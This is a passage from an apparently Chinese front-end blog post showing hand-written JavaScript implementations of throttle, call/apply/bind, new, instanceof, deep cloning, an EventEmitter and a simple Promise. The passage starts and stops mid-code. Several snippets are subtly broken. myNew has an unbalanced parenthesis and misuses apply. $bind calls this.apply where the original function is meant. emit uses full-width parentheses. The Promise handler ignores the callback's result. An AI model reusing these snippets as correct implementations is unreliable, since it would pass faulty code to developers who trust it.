&#123; </span><br><span class=\"line\">      <span class=\"comment\">//让方法在脱离事件后也能执行一次 </span></span><br><span class=\"line\">      timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123; </span><br><span class=\"line\">          fn.apply(context, args); </span><br><span class=\"line\">      &#125;, threshhold); </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">  &#125;; </span><br><span class=\"line\">&#125;; </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 该实现比较简单，但问题在于执行的始终是某一时间段内的第一个函数，而不是最后一个，可能并不准确 </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">throttle</span>(<span class=\"params\">fn, delay = <span class=\"number\">500</span>, immediate = <span class=\"literal\">false</span></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> timer;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> args = <span class=\"built_in\">arguments</span>;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> context = <span class=\"built_in\">this</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (immediate) &#123;</span><br><span class=\"line\">      fn.apply(context, args);</span><br><span class=\"line\">      immediate = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!timer) &#123;</span><br><span class=\"line\">      timer = <span class=\"built_in\">setTimeout</span>(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">        fn.apply(context, args);</span><br><span class=\"line\">        timer = <span class=\"literal\">null</span>;</span><br><span class=\"line\">      &#125;, delay);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"call、apply-和-bind-函数\"><a href=\"#call、apply-和-bind-函数\" class=\"headerlink\" title=\"call、apply 和 bind 函数\"></a>call、apply 和 bind 函数</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Function</span>.prototype.$call = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">context</span>) </span>&#123;</span><br><span class=\"line\">  context = context || <span class=\"built_in\">window</span>;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> fn = +<span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>() + <span class=\"string\">&#x27;&#x27;</span> + <span class=\"built_in\">Math</span>.random(); <span class=\"comment\">// 防止同名的 key</span></span><br><span class=\"line\">  context[fn] = <span class=\"built_in\">this</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">const</span> args = [...arguments].slice(<span class=\"number\">1</span>);</span><br><span class=\"line\">  <span class=\"keyword\">const</span> result = <span class=\"built_in\">eval</span>(<span class=\"string\">&#x27;context[fn](&#x27;</span> + args.toString() +<span class=\"string\">&#x27;)&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">delete</span> context[fn];</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">Function</span>.prototype.$apply = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">context, args = []</span>) </span>&#123;</span><br><span class=\"line\">  context = context || <span class=\"built_in\">window</span>;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> fn = +<span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>() + <span class=\"string\">&#x27;&#x27;</span> + <span class=\"built_in\">Math</span>.random(); <span class=\"comment\">// 防止同名的 key</span></span><br><span class=\"line\">  context[fn] = <span class=\"built_in\">this</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">const</span> result = context[fn](...args);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">delete</span> context[fn];</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Function.prototype.bind 方法的实现</span></span><br><span class=\"line\"><span class=\"built_in\">Function</span>.prototype.$bind = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">context</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> self = <span class=\"built_in\">this</span>;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> args = <span class=\"built_in\">Array</span>.prototype.slice.call(<span class=\"built_in\">arguments</span>, <span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"keyword\">let</span> fBind = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// 说明：一个绑定函数也能使用 new 操作符创建对象，并需要继承原函数的原型链方法，这种行为就像把原函数当成构造器，提供的 this 值被忽略，同时调用时的参数被提供给模拟函数</span></span><br><span class=\"line\">        <span class=\"comment\">// 通过 new 方法使用该绑定函数时，this 指向新创建的对象，则 this instanceof fBind 成立</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.apply(<span class=\"built_in\">this</span> <span class=\"keyword\">instanceof</span> fBind ? <span class=\"built_in\">this</span> : context, args.concat(<span class=\"built_in\">arguments</span>));</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"comment\">// 用于把原型链传递下去</span></span><br><span class=\"line\">    fBind.prototype = <span class=\"built_in\">Object</span>.create(<span class=\"built_in\">this</span>.prototype);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">// ES5 中才加入 Object.create() 和 Function.prototype.bind，所以 Function.prototype.bind 不能使用时，Object.create() 也不能使用，所以使用中转函数将原型链传递下去</span></span><br><span class=\"line\">    <span class=\"comment\">// function F () &#123;&#125;</span></span><br><span class=\"line\">    <span class=\"comment\">// F.prototype = this.prototype;</span></span><br><span class=\"line\">    <span class=\"comment\">// fBind.prototype = new F();</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> fBind;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"实现-new-操作符\"><a href=\"#实现-new-操作符\" class=\"headerlink\" title=\"实现 new 操作符\"></a>实现 new 操作符</h3><p>使用 new 操作符创建一个对象时，会进行以下步骤：</p>\n<ol>\n<li>创建（或者说构造）一个全新的对象。</li>\n<li>这个新对象会被执行 [[ 原型 ]] 连接。</li>\n<li>这个新对象会绑定到函数调用的 this 。</li>\n<li>如果函数没有返回其他对象，那么 new 表达式中的函数调用会自动返回这个新对象。</li>\n</ol>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">myNew</span>(<span class=\"params\">fn, ...args</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// let obj = &#123;&#125;;</span></span><br><span class=\"line\">  <span class=\"comment\">// obj.__proto__ fn.prototype;</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> obj = <span class=\"built_in\">Object</span>.create(fn.prototype);</span><br><span class=\"line\">  <span class=\"keyword\">let</span> result = fn.apply(obj, ...args);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ((result &amp;&amp; <span class=\"keyword\">typeof</span> result === <span class=\"string\">&#x27;object&#x27;</span>) || <span class=\"keyword\">typeof</span> result === <span class=\"string\">&#x27;function&#x27;</span>)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> obj;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"实现-instanceof-操作符\"><a href=\"#实现-instanceof-操作符\" class=\"headerlink\" title=\"实现 instanceof 操作符\"></a>实现 instanceof 操作符</h3><p><strong>instanceof 的原理</strong>是右侧对象的原型对象（prototype ）是否在左侧对象的原型链上面</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">myInstanceof</span>(<span class=\"params\">left, right</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> leftProp = left.__proto__;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> rightProp = right.prototype;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 一直会执行循环  直到函数return</span></span><br><span class=\"line\">  <span class=\"keyword\">while</span> (<span class=\"literal\">true</span>) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 遍历到了原型链最顶层</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (leftProp === <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (leftProp === rightProp) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"comment\">// 遍历赋值__proto__做对比</span></span><br><span class=\"line\">      leftProp = leftProp.__proto__;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"实现深度拷贝\"><a href=\"#实现深度拷贝\" class=\"headerlink\" title=\"实现深度拷贝\"></a>实现深度拷贝</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 定义一个深拷贝函数  接收目标target参数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">deepClone</span>(<span class=\"params\">target</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> result;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> target === <span class=\"string\">&#x27;object&#x27;</span>) &#123; <span class=\"comment\">// 如果当前需要深拷贝的是一个对象的话</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"built_in\">Array</span>.isArray(target)) &#123;</span><br><span class=\"line\">        result = []; <span class=\"comment\">// 将result赋值为一个数组，并且执行遍历</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i <span class=\"keyword\">in</span> target) &#123;</span><br><span class=\"line\">          result.push(deepClone(target[i]))</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (target === <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">        result = <span class=\"literal\">null</span>;</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(target.constructor === <span class=\"built_in\">RegExp</span>)&#123;</span><br><span class=\"line\">        result = target;</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        result = &#123;&#125;;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i <span class=\"keyword\">in</span> target) &#123;</span><br><span class=\"line\">          result[i] = deepClone(target[i]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123; <span class=\"comment\">// 如果不是对象的话，就是基本数据类型，那么直接赋值</span></span><br><span class=\"line\">      result = target;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 如果是基本数据类型，直接返回</span></span><br><span class=\"line\"><span class=\"comment\">// 如果是 RegExp 或者 Date 类型，返回对应类型</span></span><br><span class=\"line\"><span class=\"comment\">// 如果是复杂数据类型，递归。</span></span><br><span class=\"line\"><span class=\"comment\">// 考虑循环引用的问题</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">deepClone</span>(<span class=\"params\">obj, hash = <span class=\"keyword\">new</span> <span class=\"built_in\">WeakMap</span>()</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">//递归拷贝</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (obj <span class=\"keyword\">instanceof</span> <span class=\"built_in\">RegExp</span>) <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">RegExp</span>(obj);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (obj <span class=\"keyword\">instanceof</span> <span class=\"built_in\">Date</span>) <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>(obj);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (obj === <span class=\"literal\">null</span> || <span class=\"keyword\">typeof</span> obj !== <span class=\"string\">&quot;object&quot;</span>) &#123;</span><br><span class=\"line\">    <span class=\"comment\">//如果不是复杂数据类型，直接返回</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> obj;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (hash.has(obj)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> hash.get(obj);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">   * 如果obj是数组，那么 obj.constructor 是 [Function: Array]</span></span><br><span class=\"line\"><span class=\"comment\">   * 如果obj是对象，那么 obj.constructor 是 [Function: Object]</span></span><br><span class=\"line\"><span class=\"comment\">   */</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> t = <span class=\"keyword\">new</span> obj.constructor();</span><br><span class=\"line\">  hash.set(obj, t);</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> key <span class=\"keyword\">in</span> obj) &#123;</span><br><span class=\"line\">    <span class=\"comment\">//递归</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (obj.hasOwnProperty(key)) &#123;</span><br><span class=\"line\">      <span class=\"comment\">//是否是自身的属性</span></span><br><span class=\"line\">      t[key] = deepClone(obj[key], hash);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> t;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"EventEmitter-发布订阅模式\"><a href=\"#EventEmitter-发布订阅模式\" class=\"headerlink\" title=\"EventEmitter (发布订阅模式)\"></a>EventEmitter (发布订阅模式)</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 手写发布订阅模式 EventEmitter</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">EventEmitter</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">constructor</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.events = <span class=\"built_in\">Object</span>.create(<span class=\"literal\">null</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 实现订阅</span></span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">on</span>(<span class=\"params\">type, callBack</span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"built_in\">this</span>.events[type]) &#123;</span><br><span class=\"line\">      <span class=\"built_in\">this</span>.events[type] = [];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">this</span>.events[type].push(callBack);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 删除订阅</span></span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">off</span>(<span class=\"params\">type, callBack</span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"built_in\">this</span>.events[type]) <span class=\"keyword\">return</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">this</span>.events[type] = <span class=\"built_in\">this</span>.events[type].filter(<span class=\"function\"><span class=\"params\">item</span> =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> item !== callBack;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 只执行一次订阅事件</span></span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">once</span>(<span class=\"params\">type, callBack</span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">fn</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">      callBack();</span><br><span class=\"line\">      <span class=\"built_in\">this</span>.off(type, fn);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.on(type, fn);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">// 触发事件</span></span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">emit</span>(<span class=\"params\">type, ...rest</span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>（<span class=\"built_in\">this</span>.events[type]）&#123;</span><br><span class=\"line\">      <span class=\"built_in\">this</span>.events[type].forEach(<span class=\"function\"><span class=\"params\">fn</span> =&gt;</span> fn.apply(<span class=\"built_in\">this</span>, rest))</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n<h3 id=\"Promise-实现\"><a href=\"#Promise-实现\" class=\"headerlink\" title=\"Promise 实现\"></a>Promise 实现</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// Promise 简易版实现原理</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> <span class=\"built_in\">Promise</span> = <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Promise</span>(<span class=\"params\">fn</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> callbacks = [];</span><br><span class=\"line\">  <span class=\"keyword\">var</span> state = <span class=\"string\">&quot;pending&quot;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> value;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">handler</span>(<span class=\"params\">callback</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (state === <span class=\"string\">&quot;pending&quot;</span>) &#123;</span><br><span class=\"line\">      callbacks.push(callback);</span><br><span class=\"line\">      <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> cb = state === <span class=\"string\">&quot;fulfilled&quot;</span> ? callback.fulfilledCb : callback.rejectedCb;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (cb === <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">      <span class=\"comment\">// then 方法不传任何参数</span></span><br><span class=\"line\">      cb = state === <span class=\"string\">&quot;fulfilled&quot;</span> ? callback.resolve : callback.reject;</span><br><span class=\"line\">      cb(value);</span><br><span class=\"line\">      <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> ret = cb(value);</span><br><span class=\"line\">    callback.resolve(value);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">execute</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">setTimeout</span>(<span class=\"function\">() =&gt;</span> callbacks.map(<span class=\"function\">(<span class=\"params\">cb</span>) =&gt;</span> handler(cb)), <span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">resolve</span>(<span class=\"params\">val</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (val &amp;&amp; <span class=\"keyword\">typeof</span> val.then === <span class=\"string\">&quot;function&quot;</span>) &#123;</span><br><span class=\"line\">      <span class=\"comment\">// 判断 resolve() 中的参数是否为 promise 对象</span></span><br><span class=\"line\">      val.then(resolve, reject);</span><br><span class=\"line\">      <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    value = val;</span><br><span class=\"line\">    state = <span class=\"string\">&quot;fulfilled&quot;</span>;</span><br><span class=\"line\">    execute();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">reject</span>(<span class=\"params\">val</span>) </span>&#123;</span><br><span class=\"line\">    value = val;</span><br><span class=\"line\">    state = <span class=\"string\">&quot;rejected&quot;</span>;</span><br><span class=\"line\">    execute();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">this</span>.then = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">fulfilledCb, rejectedCb</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class=\"line\">      handler(&#123;</span><br><span class=\"line\">        fulfilledCb: fulfilledCb || <span class=\"literal\">null</span>,</span><br><span class=\"line\">        rejectedCb: rejectedCb || <span class=\"literal\">null</span>,</span><br><span class=\"line\">        resolve: resolve,</span><br><span class=\"line\">        reject: reject,</span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  fn(resolve, reject);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> num = <span class=\"built_in\">Math</span>.random();</span><br><span class=\"line\">  num &gt; <span class=\"number\">0.5</span> ? resolve(num) : reject(num);</span><br><span class=\"line\">&#125;).then(</span><br><span class=\"line\">  (num) =&gt; <span 